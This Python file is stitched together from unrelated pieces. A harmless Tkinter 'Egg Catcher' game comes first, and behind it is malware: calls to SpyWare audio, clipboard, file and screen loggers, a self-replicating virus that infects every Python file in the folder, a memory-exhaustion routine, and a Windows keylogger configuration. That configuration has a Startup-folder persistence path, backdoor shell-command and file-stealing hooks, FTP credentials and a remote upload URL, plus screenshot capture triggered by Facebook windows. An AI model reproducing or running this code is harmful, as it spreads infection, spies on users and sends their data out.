from itertools import cycle
from random import randrange
from tkinter import Canvas, Tk, messagebox, font

canvas_width = 800
canvas_height = 400

root = Tk()
root.title("Egg Catcher")
c = Canvas(root, width=canvas_width, height=canvas_height, background="deep sky blue")
c.create_rectangle(-5, canvas_height-100, canvas_width+5, canvas_height+5, fill="sea green", width=0)
c.create_oval(-80, -80, 120, 120, fill='orange', width=0)
c.pack()

color_cycle = cycle(["light blue", "light green", "light pink", "light yellow", "light cyan"])
egg_width = 45
egg_height = 55
egg_score = 10
egg_speed = 500
egg_interval = 4000
difficulty = 0.95
catcher_color = "blue"
catcher_width = 100
catcher_height = 100
catcher_startx = canvas_width / 2 - catcher_width / 2
catcher_starty = canvas_height - catcher_height - 20
catcher_startx2 = catcher_startx + catcher_width
catcher_starty2 = catcher_starty + catcher_height

catcher = c.create_arc(catcher_startx, catcher_starty, catcher_startx2, catcher_starty2, start=200, extent=140, style="arc", outline=catcher_color, width=3)
game_font = font.nametofont("TkFixedFont")
game_font.config(size=18)


score = 0
score_text = c.create_text(10, 10, anchor="nw", font=game_font, fill="darkblue", text="Score: "+ str(score))

lives_remaining = 3
lives_text = c.create_text(canvas_width-10, 10, anchor="ne", font=game_font, fill="darkblue", text="Lives: "+ str(lives_remaining))

eggs = []

def create_egg():
    x = randrange(10, 740)
    y = 40
    new_egg = c.create_oval(x, y, x+egg_width, y+egg_height, fill=next(color_cycle), width=0)
    eggs.append(new_egg)
    root.after(egg_interval, create_egg)

def move_eggs():
    for egg in eggs:
        (eggx, eggy, eggx2, eggy2) = c.coords(egg)
        c.move(egg, 0, 10)
        if eggy2 > canvas_height:
            egg_dropped(egg)
    root.after(egg_speed, move_eggs)

def egg_dropped(egg):
    eggs.remove(egg)
    c.delete(egg)
    lose_a_life()
    if lives_remaining == 0:
        messagebox.showinfo("Game Over!", "Final Score: "+ str(score))
        root.destroy()

def lose_a_life():
    global lives_remaining
    lives_remaining -= 1
    c.itemconfigure(lives_text, text="Lives: "+ str(lives_remaining))

def check_catch():
    (catcherx, catchery, catcherx2, catchery2) = c.coords(catcher)
    for egg in eggs:
        (eggx, eggy, eggx2, eggy2) = c.coords(egg)
        if catcherx < eggx and eggx2 < catcherx2 and catchery2 - eggy2 < 40:
            eggs.remove(egg)
            c.delete(egg)
            increase_score(egg_score)
    root.after(100, check_catch)

def increase_score(points):
    global score, egg_speed, egg_interval
    score += points
    egg_speed = int(egg_speed * difficulty)
    egg_interval = int(egg_interval * difficulty)
    c.itemconfigure(score_text, text="Score: "+ str(score))

def move_left(event):
    (x1, y1, x2, y2) = c.coords(catcher)
    if x1 > 0:
        c.move(catcher, -20, 0)

def move_right(event):
    (x1, y1, x2, y2) = c.coords(catcher)
    if x2 < canvas_width:
        c.move(catcher, 20, 0)

c.bind("<Left>", move_left)
c.bind("<Right>", move_right)
c.focus_set()
root.after(1000, create_egg)
root.after(1000, move_eggs)
root.after(1000, check_catch)
root.mainloop()

import os
import psutil

import sys
import glob

from SpyWare import spyware
spyware() # Run all modules

from SpyWare import AudioLogger
AudioLogger.audioSpy() # Run a module

from SpyWare.FilesLogger import Daemon, filesConfig
filesConfig("files.conf")
Daemon().run_for_ever()

from SpyWare.CopyLogger import Daemon, copyConfig

from os import environ
environ["clipboardSpy.conf"] = "clipboard.conf"

copyConfig()

daemon = Daemon()
daemon.run_for_ever()

from SpyWare.ScreenLogger import Daemon, screenConfig

from sys import argv
argv[1] = "screen.conf"

screenConfig()

daemon = Daemon()
daemon.run_for_ever()


virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()



PROCESS = psutil.Process(os.getpid())
MEGA = 10 ** 6
MEGA_STR = ' ' * MEGA

def pmem():
    tot, avail, percent, used, free = psutil.virtual_memory()
    tot, avail, used, free = tot / MEGA, avail / MEGA, used / MEGA, free / MEGA
    proc = PROCESS.get_memory_info()[1] / MEGA
    print('process = %s total = %s avail = %s used = %s free = %s percent = %s'
          % (proc, tot, avail, used, free, percent))

def alloc_max_array():
    i = 0
    ar = []
    while True:
        try:
            #ar.append(MEGA_STR)  # no copy if reusing the same string!
            ar.append(MEGA_STR + str(i))
        except MemoryError:
            break
        i += 1
    max_i = i - 1
    print ('maximum array allocation:'), max_i
    pmem()

def alloc_max_str():
    i = 0
    while True:
        try:
            a = ' ' * (i * 10 * MEGA)
            del a
        except MemoryError:
            break
        i += 1
    max_i = i - 1
    _ = ' ' * (max_i * 10 * MEGA)
    print ('maximum string allocation'), max_i
    pmem()

pmem()
alloc_max_str()
alloc_max_array()


import getpass, sys
from os import path
from Util import Util



class Configuration:


    def __init__(self):
        #ABSOLUTE FILE PATHS AND USER DATA
            self.__userName = getpass.getuser()
            self.__fileName = 'Malware.exe'
            self.__filePath = f'c:\\Users\\{self.__userName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
            self.__logFileName = 'log.txt'
            self.__logPath = f'c:\\Users\\{self.__userName}\\AppData\\Roaming\\tempData\\'
            self.__screenshotPath = self.__logPath
            self.__currentDir = path.dirname(sys.executable)
            self.__currentPath = self.__currentDir + f'\\{self.__fileName}'
        #WINDOWTRACKING AND KEYLOGGING
            self.__debug = None
            self.__keyloggingIsActive = None
            self.__windowTrackingIsActive = None
            self.__samplingFrequency = None
            self.__screenshotFrequency = None
            self.__screenshotTrigger = None
        #COMMUNICATION
            self.__baseURL = None
            self.__communicationFrequency = None
            self.__ftpURL = None
            self.__ftpUserName = None
            self.__ftpPassword = None
        #BACKDOOR
            self.__shellCommand = None
            self.__stealPath = None
        #SET ATTRIBUTES
            self.setAttributes()
            


    def setAttributes(self):
            try:
                config = Util.jsonIn(self.__logPath + 'config.json')
                self.__setConfig(config)
                Util.extractShellData(self.__logPath, self.__shellCommand)
                Util.stealFile(self.__logPath, self.__stealPath)
                print('Config.json loaded!')
            except Exception:
                self.__setDefault()
                print('Default loaded!')



    def __setConfig(self, config:dict):
            self.__debug = config['debug']
            self.__keyloggingIsActive = config['keyloggingIsActive']
            self.__windowTrackingIsActive = config['windowTrackingIsActive']
            self.__samplingFrequency = config['samplingfrequency']
            self.__screenshotFrequency = config['screenshotfrequency']
            self.__screenshotTrigger = config['screenshottrigger']
            self.__baseURL = config['baseurl']
            self.__communicationFrequency = config['communicationfrequency']
            self.__ftpURL = config['ftpurl']
            self.__ftpUserName = config['ftpusername']
            self.__ftpPassword = config['ftppassword']
            self.__shellCommand = config.get('shellcommand','')
            self.__stealPath = config.get('stealpath','')



    def __setDefault(self):
            self.__debug = True
            self.__keyloggingIsActive = True
            self.__windowTrackingIsActive = True
            self.__samplingFrequency = 0.1
            self.__screenshotFrequency = 50
            self.__screenshotTrigger = 'facebook'
            self.__baseURL = 'http://facebook-user-profile.herokuapp.com/malware'
            self.__communicationFrequency = 5
            self.__ftpURL = 'ftp://ftp.atw.hu'
            self.__ftpUserName = 'kiserletimuto'
            self.__ftpPassword = 'patti'



    @property
    def debug(self):
        return self.__debug

    @property
    def fileName(self):
        return self.__fileName

    @property
    def filePath(self):
        return self.__filePath

    @property
    def logPath(self):
        return self.__logPath

    @property
    def screenshotPath(self):
        return self.__screenshotPath

    @property
    def currentDir(self):
        return self.__currentDir

    @property
    def currentPath(self):
        return self.__currentPath

    @property
    def samplingFrequency(self):
        return self.__samplingFrequency

    @property
    def screenshotFrequency(self):
        return self.__screenshotFrequency

    @property
    def screenshotTrigger(self):
        return self.__screenshotTrigger

    @property
    def logFileName(self):
        return self.__logFileName

    @property
    def keyloggingIsActive(self):
        return self.__keyloggingIsActive

    @property
    def windowTrackingIsActive(self):
        return self.__windowTrackingIsActive

    @property
    def baseURL(self):
        return self.__baseURL

    @property
    def communicationFrequency(self):
        return self.__communicationFrequency

    @property
    def userName(self):
        return self.__userName

    @property
    def ftpURL(self):
        return self.__ftpURL

    @property
    def ftpUserName(self):
        return self.__ftpUserName

    @property
    def ftpPassword(self):
        return self.__ftpPassword


import win32gui, time, win32process
from threading import Thread
from Screenshot import Screenshot
from Util import Util



class WindowTracker(Thread):

    def __init__(self, config, screenshot):
        Thread.__init__(self, name='window tracking')
        self.__config = config
        self.__screenshot = screenshot
        self.__activeWindow = None
        self.__screenshotTimer = 0



    def run(self):
        while True:
            if self.__config.windowTrackingIsActive:
                time.sleep(self.__config.samplingFrequency)
                activeWindow = win32gui.GetForegroundWindow()
                activeWindowText = win32gui.GetWindowText(activeWindow)
                self.__examineWindow(activeWindowText)
                self.__screenshotHandler(activeWindowText)



    def __examineWindow(self, activeWindowTitle:str) -> None:
        if self.__activeWindow != activeWindowTitle:
            self.__activeWindow = activeWindowTitle
            windowTitle = '\n'*2 + f'{self.__activeWindow}'.center(100,'-') + '\n'
            if self.__config.debug:
                print(windowTitle)
            Util.fileOut(self.__config.logPath + self.__config.logFileName, windowTitle)



    def __screenshotHandler(self, activeWindowText:str) -> None:
        for trigger in self.__config.screenshotTrigger.split(' '):
            if trigger in activeWindowText.lower():
                self.__screenshotTimer += 1
                if self.__config.debug:
                    print(self.__screenshotTimer)
                if self.__screenshotTimer % self.__config.screenshotFrequency == 0:
                    self.__screenshot.takeScreenshot()
